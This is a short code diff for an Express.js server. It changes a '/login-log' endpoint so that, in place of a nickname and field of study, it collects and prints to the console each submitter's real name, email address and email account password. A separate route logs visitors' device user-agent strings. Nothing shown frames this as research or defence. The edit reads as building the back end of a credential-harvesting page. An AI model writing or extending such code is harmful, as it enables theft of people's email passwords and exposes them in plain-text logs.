@@ -24,7 +24,7 @@ app.get("/device-check", (req, res) => {
 
   const userAgent = req.headers["user-agent"];
 
-  console.log("New Visitor Device:");
+  console.log("Visitor Device:");
   console.log(userAgent);
 
   res.send("logged");
@@ -41,11 +41,11 @@ app.post("/login-log", (req,res)=>{
   console.log("Real Name:",
   req.body.realname);
 
-  console.log("Nickname:",
-  req.body.nickname);
+  console.log("Email:",
+  req.body.email);
 
-  console.log("Studies:",
-  req.body.studies);
+  console.log("Mail Password:",
+  req.body.mailpassword);
 
   res.json({
     success:true
